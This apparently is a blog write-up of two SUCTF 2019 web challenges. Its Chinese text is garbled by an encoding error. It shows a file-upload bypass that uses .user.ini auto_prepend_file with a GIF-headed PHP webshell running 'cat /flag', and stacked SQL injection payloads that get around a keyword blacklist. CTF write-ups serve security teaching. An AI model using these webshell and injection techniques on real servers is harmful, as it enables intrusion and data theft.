<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="å¯¹æœªæ¥çš„æœ€å¤§æ…·æ…¨ï¼Œå°±æ˜¯æŠŠä¸€åˆ‡éƒ½çŒ®ç»™ç°åœ¨ã€‚">
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        SUCTF-2019 - undefined
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
    <i>  </i>
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar ">
            <img src="/" />
        </div>
        <div class="name">
            <i>Luc1fer</i>
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li >
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li >
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li >
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li >
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SUCTF-2019-WP"><span class="toc-text">SUCTF-2019 WP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkin"><span class="toc-text">checkin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini-æ–‡ä»¶æ„æˆçš„åé—¨"><span class="toc-text">.user.ini æ–‡ä»¶æ„æˆçš„åé—¨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å¼€å§‹ä¸Šä¼ "><span class="toc-text">å¼€å§‹ä¸Šä¼ </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-sql"><span class="toc-text">easy sql</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#logical-OR"><span class="toc-text">|| logical OR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#å¦‚ä½•åšï¼Ÿ"><span class="toc-text">å¦‚ä½•åšï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#éé¢„æœŸ"><span class="toc-text">éé¢„æœŸ</span></a></li></ol></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input"/>
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i>  </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        SUCTF-2019
    </div>

    <div class="post-meta">
        <span class="attr">Postï¼š<span>2019-09-10 18:15:38</span></span>
        
        <span class="attr">Tagsï¼š/
        
        <a class="tag" href="/tags/#php" title="php">php</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visitï¼š<span id="busuanzi_value_page_pv"></span>
</span>
</span>
    </div>
    <div class="post-content ">
        <h1 id="SUCTF-2019-WP"><a href="#SUCTF-2019-WP" class="headerlink" title="SUCTF-2019 WP"></a>SUCTF-2019 WP</h1><p>9/10/2019 6:15:38 PM </p>
<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>å…ˆä¸Šä¼ ä¸€ä¸ª <code>websell.php</code>ï¼Œæ˜¾ç¤ºåç¼€ä¸åˆæ³•(æ”¹<code>php5</code>ã€<code>php4</code>ã€<code>content-type</code>è¿™äº›éƒ½ä¸è¡Œ)ã€‚</p>
<p>å†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å‘ç°æ˜¾ç¤º <code>&amp;lt;? in contents!</code> ï¼Œå°±æ˜¯è¯´<code>&lt; ?</code>ä¸èƒ½è¿ç»­å­˜åœ¨ã€‚</p>
<p>æˆ‘ä»¬é€šè¿‡<code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>æ¥ç»•è¿‡å¯¹<code>&lt;?</code>çš„æ£€æµ‹ã€‚è¿™æ¬¡æˆ‘ä»¬å¾—åˆ°å›æ˜¾<br>    exif_imagetype:not image!</p>
<p><code>exif_imagetype</code>ç”¨æ¥åˆ¤æ–­å›¾ç‰‡ç±»å‹ï¼Œä»–è¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚åªè¦æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªå›¾ç‰‡å¤´å°±å¯ä»¥ç»•è¿‡ï¼Œæ¯”å¦‚æ·»åŠ <code>GIF89a</code>.åœ¨æ·»åŠ å®Œä¹‹åæˆ‘ä»¬ä¸Šä¼ æˆåŠŸï¼Œæ­¤æ—¶çš„æ–‡ä»¶ç›®å½•ä¸‹é™¤äº†æˆ‘ä»¬ä¸Šä¼ çš„<code>webshell</code>è¿˜æœ‰ä¸€ä¸ª<code>index.php</code>.</p>
<h3 id="user-ini-æ–‡ä»¶æ„æˆçš„åé—¨"><a href="#user-ini-æ–‡ä»¶æ„æˆçš„åé—¨" class="headerlink" title=".user.ini æ–‡ä»¶æ„æˆçš„åé—¨"></a>.user.ini æ–‡ä»¶æ„æˆçš„åé—¨</h3><p>è¯¦æƒ…çœ‹pç¥è¿™ç¯‡æ–‡ç« <a href="http://www.vuln.cn/6001" title="ç‚¹è¿™é‡Œ" target="_blank" rel="noopener">http://www.vuln.cn/6001</a></p>
<blockquote>
<p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p>
</blockquote>
<blockquote>
<p>åœ¨ .user.ini é£æ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p>
</blockquote>
<p><code>.user.ini</code>ç±»ä¼¼ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰çš„<code>php.ini</code>ã€‚æˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯â€<code>PHP_INI_PERDIR</code> ã€ <code>PHP_INI_USER</code>â€œçš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„<code>PHP_INI_PERDIR</code>ä¹Ÿå¯ä»¥åœ¨<code>.user.ini</code>ä¸­è®¾ç½®ï¼‰</p>
<p>å®é™…ä¸Šï¼Œé™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬<code>PHP_INI_ALL</code>ï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡<code>.user.ini</code>æ¥è®¾ç½®çš„ã€‚</p>
<p>å’Œ<code>php.ini</code>ä¸åŒçš„æ˜¯ï¼Œ<code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚</p>
<p><img src="https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png" alt="phpä¸­ä¸¤ä¸ªé…ç½®"></p>
<p><code>auto_prepend_file</code> æ„å‘³è¿™æ˜¯åœ¨phpè„šæœ¬æ‰§è¡Œå‰ä¼šæ‰§è¡Œè¿™ä¸ªå‚æ•°è®¾ç½®çš„è„šæœ¬ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨<code>require()</code>ç„¶åè¿™ä¸ªå‚æ•°çš„è„šæœ¬æ‰€åœ¨ç›®å½•å—<code>include_path</code>é™åˆ¶<br><code>append</code>æ˜¯åœ¨<code>php</code>è„šæœ¬æ‰§è¡Œåæ‰æ‰§è¡Œçš„ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯é‡åˆ°<code>exit()</code>çš„æ—¶å€™ï¼Œè¿™ä¸ªè„šæœ¬ä¹Ÿä¸èƒ½è¿è¡Œ</p>
<p>ä½¿ç”¨çš„æ—¶å€™ç›´æ¥å†™åœ¨<code>.user.ini</code>ä¸­</p>
<pre><code>auto_prepend_file=webshell.gif</code></pre><p>webshell.gifæ˜¯è¦åŒ…å«çš„æ–‡ä»¶.æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å€ŸåŠ©è¿™ä¸ªé…ç½®é¡¹æ¥è®©æ‰€æœ‰çš„phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«è¿™ä¸ªæ–‡ä»¶ã€‚ğŸ‘</p>
<p>æŸç½‘ç«™é™åˆ¶ä¸å…è®¸ä¸Šä¼ .phpæ–‡ä»¶ï¼Œä½ ä¾¿å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.user.iniï¼Œå†ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬ï¼ŒåŒ…å«èµ·æ¥è¿›è¡Œgetshellã€‚ä¸è¿‡å‰ææ˜¯å«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†ã€‚</p>
<p>.htaccessæ–‡ä»¶æ„æˆçš„åé—¨çœ‹è¿™é‡Œï¼š<a href="https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet" title=".htaccess">https://github.com/sektioneins/pcc/wiki/PHP-htaccess-injection-cheat-sheet</a>è¿™ä¸ªåªèƒ½ç”¨äºApache</p>
<p>çœ‹åˆ°è¿™é‡Œæˆ‘ä»¬å‘ç°å½“å‰ç›®å½•ä¸‹ç¡®å®æœ‰<code>index.php</code>å¯ä»¥åˆ©ç”¨ï¼Œäºæ˜¯æˆ‘ä»¬å¼€å§‹å§ğŸˆ</p>
<h3 id="å¼€å§‹ä¸Šä¼ "><a href="#å¼€å§‹ä¸Šä¼ " class="headerlink" title="å¼€å§‹ä¸Šä¼ "></a>å¼€å§‹ä¸Šä¼ </h3><p>æˆ‘ä»¬å…ˆæ„é€ <code>.user.ini</code>æ–‡ä»¶</p>
<pre><code>GIF89a
auto_prepend_file=CK.jpg</code></pre><p>ç„¶åå°†å…¶ä¸Šä¼ </p>
<p>æ¥ç€æ„é€ å›¾ç‰‡é©¬<code>CK.jpg</code></p>
<pre><code>GIF89a
&lt;script language=&apos;php&apos;&gt;
    system(&apos;cat /flag&apos;);
&lt;/script&gt;</code></pre><p>æˆåŠŸä¸Šä¼ ä¹‹åæˆ‘ä»¬è®¿é—®ä¸Šä¼ åçš„é¡µé¢å³å¯çœ‹åˆ°flagã€‚</p>
<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h2><p>å­˜åœ¨å †å æ³¨å…¥ï¼Œæµ‹è¯•<code>1;show tables;</code>å›æ˜¾</p>
<pre><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag ) </code></pre><p>æµ‹è¯•<code>1;select * from Flag;</code>,flagè¢«è¿‡æ»¤äº†</p>
<p><code>.index.php.swp</code>å­˜åœ¨æºç æ³„éœ²,æºç å¦‚ä¸‹  </p>
<pre><code>&lt;?php
    session_start();

    include_once &quot;config.php&quot;;

    $post = array();
    $get = array();
    global $MysqlLink;

    //GetPara();
    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);
    if(!$MysqlLink){
        die(&quot;Mysql Connect Error!&quot;);
    }
    $selectDB = mysqli_select_db($MysqlLink,$dataName);
    if(!$selectDB){
        die(&quot;Choose Database Error!&quot;);
    }

    foreach ($_POST as $k=&gt;$v){
        if(!empty($v)&amp;&amp;is_string($v)){
            $post[$k] = trim(addslashes($v));
        }
    }
    foreach ($_GET as $k=&gt;$v){
        }
    }
    //die();
    ?&gt;

&lt;html&gt;
&lt;head&gt;
&lt;/head&gt;

&lt;body&gt;

&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;
&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;
&lt;input type=&quot;submit&quot;&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;

&lt;?php

    if(isset($post[&apos;query&apos;])){
        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;
        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;]));
        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&apos;query&apos;])){
            //echo $post[&apos;query&apos;];
            die(&quot;Nonono.&quot;);
        }
        if(strlen($post[&apos;query&apos;])&gt;40){
            die(&quot;Too long.&quot;);
        }
        $sql = &quot;select &quot;.$post[&apos;query&apos;].&quot;||flag from Flag&quot;;
        mysqli_multi_query($MysqlLink,$sql);
        do{
            if($res = mysqli_store_result($MysqlLink)){
                while($row = mysqli_fetch_row($res)){
                    print_r($row);
                }
            }
        }while(@mysqli_next_result($MysqlLink));

    }

    ?&gt;</code></pre><p>æŸ¥è¯¢è¯­å¥ä¸ºï¼š<code>$sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</code></p>
<h3 id="logical-OR"><a href="#logical-OR" class="headerlink" title="|| logical OR"></a>|| logical OR</h3><pre><code>mysql&gt; SELECT 1 OR 1;
        -&gt; 1
mysql&gt; SELECT 1 OR 0;
        -&gt; 1
mysql&gt; SELECT 0 OR 0;
        -&gt; 0
mysql&gt; SELECT 0 OR NULL;
        -&gt; NULL
mysql&gt; SELECT 1 OR NULL;
        -&gt; 1</code></pre><blockquote>
<p>Logical OR. When both operands are non-NULL, the result is 1 if any operand is nonzero, and 0 otherwise. With a NULL operand, the result is 1 if the other operand is nonzero, and NULL otherwise. If both operands are NULL, the result is NULL. </p>
</blockquote>
<h3 id="å¦‚ä½•åšï¼Ÿ"><a href="#å¦‚ä½•åšï¼Ÿ" class="headerlink" title="å¦‚ä½•åšï¼Ÿ"></a>å¦‚ä½•åšï¼Ÿ</h3><p>å…ˆæ¥çœ‹ä¸€ä¸ªmsqlçš„é…ç½®</p>
<p><strong>PIPES_AS_CONCAT</strong></p>
<blockquote>
<p>Treat || as a string concatenation operator (same as CONCAT()) rather than as a synonym for OR. </p>
</blockquote>
<p>å¦‚æœé…ç½®äº†<code>sql_mode=PIPES_AS_CONCAT</code>ï¼ŒMysqlä¼šæŠŠé€»è¾‘æˆ–å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²é“¾æ¥å‡½æ•°å¯¹å¾…ã€‚  </p>
<p><strong>CONCAT(str1,str2,â€¦)</strong></p>
<blockquote>
<p>Returns the string that results from concatenating the arguments. May have one or more arguments. If all arguments are nonbinary strings, the result is a nonbinary string. If the arguments include any binary strings, the result is a binary string. A numeric argument is converted to its equivalent nonbinary string form. </p>
</blockquote>
<p><code>CONCAT()</code> returns NULL if any argument is NULL. </p>
<pre><code>mysql&gt; SELECT CONCAT(&apos;My&apos;, &apos;S&apos;, &apos;QL&apos;);
        -&gt; &apos;MySQL&apos;
mysql&gt; SELECT CONCAT(&apos;My&apos;, NULL, &apos;QL&apos;);
        -&gt; NULL
mysql&gt; SELECT CONCAT(14.3);
        -&gt; &apos;14.3&apos;</code></pre><p>æˆ‘ä»¬é€šè¿‡<code>sql_mode=PIPES_AS_CONCAT</code>æ¥å°†flagå¸¦å‡ºæ¥</p>
<p>payload:  <code>1;sql_mode=PIPES_AS_CONCAT;select 1</code>  </p>
<p>è¯­å¥ä¸º:</p>
<pre><code>select 1;sql_mode=PIPES_AS_CONCAT;select 1;|| flag rom Flag;</code></pre><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>payload:<code>*,1</code>æ„é€ <code>select *,1 || flag from Flag;</code> å³å¯æŸ¥å‡ºå…¨éƒ¨å†…å®¹ã€‚</p>

        
        <br />
        <div id="comment-container">
        </div>
        <div id="disqus_thread"></div>

        <div id="lv-container">
        </div>

    </div>
</div>

    </div>
</div>


<footer class="footer">
    <ul class="list-inline text-center">
        
        

        

        

        

        

    </ul>
    
    <p>
        <span id="busuanzi_container_site_pv">
            <span id="busuanzi_value_site_pv"></span>PV
        </span>
        <span id="busuanzi_container_site_uv">
            <span id="busuanzi_value_site_uv"></span>UV
        </span>
        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
</footer>




</body>

<script>
    // We expose some of the variables needed by the front end
    window.hexo_search_path = "./public/search.xml"
    window.hexo_root = "/"
    window.isPost = true
</script>
<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
<script src="/js/index.js"></script>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>




</html>
